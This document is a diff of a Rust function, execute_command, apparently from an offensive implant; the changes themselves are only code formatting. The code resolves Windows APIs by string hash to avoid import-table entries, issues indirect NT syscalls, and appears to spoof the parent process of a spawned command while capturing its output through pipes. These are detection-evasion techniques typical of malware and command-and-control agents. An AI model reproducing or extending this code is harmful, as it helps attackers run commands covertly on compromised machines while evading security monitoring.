@@ -34,93 +34,92 @@ pub fn execute_command(
         let init_attr_list_addr = pe_resolve::get_proc_address_by_hash(
             k32,
             pe_resolve::hash_str(b"InitializeProcThreadAttributeList\0"),
-        ).ok_or_else(|| anyhow::anyhow!("could not resolve InitializeProcThreadAttributeList"))?;
-    type InitProcThreadAttrListFn = unsafe extern "system" fn(
-        *mut c_void,  // lpAttributeList
-        u32,          // dwAttributeCount
-        u32,          // dwFlags
-        *mut usize,   // lpSize
-    ) -> i32; // BOOL
+        )
+        .ok_or_else(|| anyhow::anyhow!("could not resolve InitializeProcThreadAttributeList"))?;
+        type InitProcThreadAttrListFn = unsafe extern "system" fn(
+            *mut c_void, // lpAttributeList
+            u32,         // dwAttributeCount
+            u32,         // dwFlags
+            *mut usize,  // lpSize
+        ) -> i32; // BOOL
         let init_attr_list: InitProcThreadAttrListFn = std::mem::transmute(init_attr_list_addr);
 
         // UpdateProcThreadAttribute
         let update_attr_addr = pe_resolve::get_proc_address_by_hash(
             k32,
             pe_resolve::hash_str(b"UpdateProcThreadAttribute\0"),
-        ).ok_or_else(|| anyhow::anyhow!("could not resolve UpdateProcThreadAttribute"))?;
-    type UpdateProcThreadAttrFn = unsafe extern "system" fn(
-        *mut c_void,  // lpAttributeList
-        u32,          // dwFlags
-        usize,        // Attribute
-        *mut c_void,  // lpValue
-        usize,        // cbSize
-        *mut c_void,  // lpPreviousValue
-        *mut usize,   // lpReturnSize
-    ) -> i32; // BOOL
+        )
+        .ok_or_else(|| anyhow::anyhow!("could not resolve UpdateProcThreadAttribute"))?;
+        type UpdateProcThreadAttrFn = unsafe extern "system" fn(
+            *mut c_void, // lpAttributeList
+            u32,         // dwFlags
+            usize,       // Attribute
+            *mut c_void, // lpValue
+            usize,       // cbSize
+            *mut c_void, // lpPreviousValue
+            *mut usize,  // lpReturnSize
+        ) -> i32; // BOOL
         let update_attr: UpdateProcThreadAttrFn = std::mem::transmute(update_attr_addr);
 
         // GetLastError – needed to distinguish ERROR_INSUFFICIENT_BUFFER from real failures.
-        let get_last_error_addr = pe_resolve::get_proc_address_by_hash(
-            k32,
-            pe_resolve::hash_str(b"GetLastError\0"),
-        ).ok_or_else(|| anyhow::anyhow!("could not resolve GetLastError"))?;
-    type GetLastErrorFn = unsafe extern "system" fn() -> u32;
+        let get_last_error_addr =
+            pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"GetLastError\0"))
+                .ok_or_else(|| anyhow::anyhow!("could not resolve GetLastError"))?;
+        type GetLastErrorFn = unsafe extern "system" fn() -> u32;
         let get_last_error: GetLastErrorFn = std::mem::transmute(get_last_error_addr);
 
         // DeleteProcThreadAttributeList
         let delete_attr_addr = pe_resolve::get_proc_address_by_hash(
             k32,
             pe_resolve::hash_str(b"DeleteProcThreadAttributeList\0"),
-        ).ok_or_else(|| anyhow::anyhow!("could not resolve DeleteProcThreadAttributeList"))?;
-    type DeleteProcThreadAttrListFn = unsafe extern "system" fn(
-        *mut c_void, // lpAttributeList
-    );
+        )
+        .ok_or_else(|| anyhow::anyhow!("could not resolve DeleteProcThreadAttributeList"))?;
+        type DeleteProcThreadAttrListFn = unsafe extern "system" fn(
+            *mut c_void, // lpAttributeList
+        );
         let delete_attr_list: DeleteProcThreadAttrListFn = std::mem::transmute(delete_attr_addr);
 
         // CreatePipe
-        let create_pipe_addr = pe_resolve::get_proc_address_by_hash(
-            k32,
-            pe_resolve::hash_str(b"CreatePipe\0"),
-        ).ok_or_else(|| anyhow::anyhow!("could not resolve CreatePipe"))?;
-    type CreatePipeFn = unsafe extern "system" fn(
-        *mut HANDLE,                              // hReadPipe
-        *mut HANDLE,                              // hWritePipe
-        *mut winapi::um::minwinbase::SECURITY_ATTRIBUTES, // lpPipeAttributes
-        u32,                                      // nSize
-    ) -> i32; // BOOL
+        let create_pipe_addr =
+            pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"CreatePipe\0"))
+                .ok_or_else(|| anyhow::anyhow!("could not resolve CreatePipe"))?;
+        type CreatePipeFn = unsafe extern "system" fn(
+            *mut HANDLE,                                      // hReadPipe
+            *mut HANDLE,                                      // hWritePipe
+            *mut winapi::um::minwinbase::SECURITY_ATTRIBUTES, // lpPipeAttributes
+            u32,                                              // nSize
+        ) -> i32; // BOOL
         let create_pipe: CreatePipeFn = std::mem::transmute(create_pipe_addr);
 
         // CreateProcessW
-        let create_process_w_addr = pe_resolve::get_proc_address_by_hash(
-            k32,
-            pe_resolve::hash_str(b"CreateProcessW\0"),
-        ).ok_or_else(|| anyhow::anyhow!("could not resolve CreateProcessW"))?;
-    type CreateProcessWFn = unsafe extern "system" fn(
-        *mut u16,                 // lpApplicationName
-        *mut u16,                 // lpCommandLine
-        *mut c_void,              // lpProcessAttributes
-        *mut c_void,              // lpThreadAttributes
-        i32,                      // bInheritHandles
-        u32,                      // dwCreationFlags
-        *mut c_void,              // lpEnvironment
-        *mut u16,                 // lpCurrentDirectory
-        *mut winapi::um::processthreadsapi::STARTUPINFOW, // lpStartupInfo
-        *mut PROCESS_INFORMATION, // lpProcessInformation
-    ) -> i32; // BOOL
+        let create_process_w_addr =
+            pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"CreateProcessW\0"))
+                .ok_or_else(|| anyhow::anyhow!("could not resolve CreateProcessW"))?;
+        type CreateProcessWFn = unsafe extern "system" fn(
+            *mut u16,                                         // lpApplicationName
+            *mut u16,                                         // lpCommandLine
+            *mut c_void,                                      // lpProcessAttributes
+            *mut c_void,                                      // lpThreadAttributes
+            i32,                                              // bInheritHandles
+            u32,                                              // dwCreationFlags
+            *mut c_void,                                      // lpEnvironment
+            *mut u16,                                         // lpCurrentDirectory
+            *mut winapi::um::processthreadsapi::STARTUPINFOW, // lpStartupInfo
+            *mut PROCESS_INFORMATION,                         // lpProcessInformation
+        ) -> i32; // BOOL
         let create_process_w: CreateProcessWFn = std::mem::transmute(create_process_w_addr);
 
         // ReadFile
-        let read_file_addr = pe_resolve::get_proc_address_by_hash(
-            k32,
-            pe_resolve::hash_str(b"ReadFile\0"),
-        ).ok_or_else(|| anyhow::anyhow!("could not resolve ReadFile"))?;
-    type ReadFileFn = unsafe extern "system" fn(
-        HANDLE,       // hFile
-        *mut c_void,  // lpBuffer
-        u32,          // nNumberOfBytesToRead
-        *mut u32,     // lpNumberOfBytesRead
-        *mut c_void,  // lpOverlapped
-    ) -> i32; // BOOL
+        let read_file_addr =
+            pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"ReadFile\0"))
+                .ok_or_else(|| anyhow::anyhow!("could not resolve ReadFile"))?;
+        type ReadFileFn = unsafe extern "system" fn(
+            HANDLE,      // hFile
+            *mut c_void, // lpBuffer
+            u32,         // nNumberOfBytesToRead
+            *mut u32,    // lpNumberOfBytesRead
+            *mut c_void, // lpOverlapped
+        ) -> i32; // BOOL
         let read_file: ReadFileFn = std::mem::transmute(read_file_addr);
 
         (
@@ -142,7 +141,8 @@ pub fn execute_command(
         let mut p_handle_raw: usize = 0;
         if parent_pid != std::process::id() {
             let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-            obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+            obj_attr.Length =
+                std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
             let mut client_id = [0u64; 2];
             client_id[0] = parent_pid as u64;
             let status = crate::syscall!(
@@ -156,7 +156,11 @@ pub fn execute_command(
                 p_handle_raw = 0;
             }
         }
-        let mut p_handle: HANDLE = if p_handle_raw != 0 { p_handle_raw as *mut _ } else { std::ptr::null_mut() };
+        let mut p_handle: HANDLE = if p_handle_raw != 0 {
+            p_handle_raw as *mut _
+        } else {
+            std::ptr::null_mut()
+        };
 
         let mut size: usize = 0;
         // First call to get required size (returns FALSE and sets size).
@@ -167,12 +171,7 @@ pub fn execute_command(
         let mut attr_list_buf;
         loop {
             attr_list_buf = vec![0u8; size];
-            let result = init_attr_list(
-                attr_list_buf.as_mut_ptr() as *mut _,
-                1,
-                0,
-                &mut size,
-            );
+            let result = init_attr_list(attr_list_buf.as_mut_ptr() as *mut _, 1, 0, &mut size);
             if result != 0 {
                 break; // Success
             }
@@ -228,12 +227,15 @@ pub fn execute_command(
                     inherit: u8,
                     protect_from_close: u8,
                 }
-                let flag_info = ObjHandleFlagInfo { inherit: 0, protect_from_close: 0 };
+                let flag_info = ObjHandleFlagInfo {
+                    inherit: 0,
+                    protect_from_close: 0,
+                };
                 let _ = crate::syscall!(
                     "NtSetInformationObject",
-                    stdout_rd as u64,                            // Handle
-                    4u64,                                        // ObjectHandleFlagInformation
-                    &flag_info as *const _ as u64,              // Info
+                    stdout_rd as u64,                                // Handle
+                    4u64,                                            // ObjectHandleFlagInformation
+                    &flag_info as *const _ as u64,                   // Info
                     std::mem::size_of::<ObjHandleFlagInfo>() as u64, // Length
                 );
                 si.StartupInfo.hStdOutput = stdout_wr;
@@ -325,8 +327,8 @@ pub fn execute_command(
         // WaitForSingleObject → NtWaitForSingleObject (indirect syscall, no IAT entry)
         let _ = crate::syscall!(
             "NtWaitForSingleObject",
-            pi.hProcess as u64,    // Handle
-            0u64,                    // Alertable = FALSE
+            pi.hProcess as u64,             // Handle
+            0u64,                           // Alertable = FALSE
             std::ptr::null::<u64>() as u64, // Timeout = NULL (infinite)
         );
 
@@ -344,13 +346,17 @@ pub fn execute_command(
         let mut pbi: ProcessBasicInformation = std::mem::zeroed();
         let _ = crate::syscall!(
             "NtQueryInformationProcess",
-            pi.hProcess as u64,                            // ProcessHandle
-            0u64,                                           // ProcessBasicInformation
-            &mut pbi as *mut _ as u64,                     // ProcessInformation
+            pi.hProcess as u64,                                    // ProcessHandle
+            0u64,                                                  // ProcessBasicInformation
+            &mut pbi as *mut _ as u64,                             // ProcessInformation
             std::mem::size_of::<ProcessBasicInformation>() as u64, // Length
-            std::ptr::null_mut::<u64>() as u64,            // ReturnLength
+            std::ptr::null_mut::<u64>() as u64,                    // ReturnLength
         );
-        let exit_code = if pbi.exit_status == 259 { 259u32 } else { pbi.exit_status as u32 };
+        let exit_code = if pbi.exit_status == 259 {
+            259u32
+        } else {
+            pbi.exit_status as u32
+        };
 
         let _ = crate::syscall!("NtClose", pi.hThread as u64);
         let _ = crate::syscall!("NtClose", pi.hProcess as u64);
